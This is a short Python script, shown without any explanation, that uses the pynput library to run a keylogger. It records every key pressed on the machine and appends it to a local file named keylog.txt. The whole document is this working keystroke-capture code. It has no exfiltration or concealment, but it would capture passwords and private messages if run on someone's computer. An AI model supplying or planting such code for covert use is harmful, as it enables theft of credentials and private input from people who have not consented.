from pynput import keyboard

def on_press(key):
    try:
        
        with open("keylog.txt", "a") as file:
            file.write(str(key) + "\n")
    except IOError:
        pass
      
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
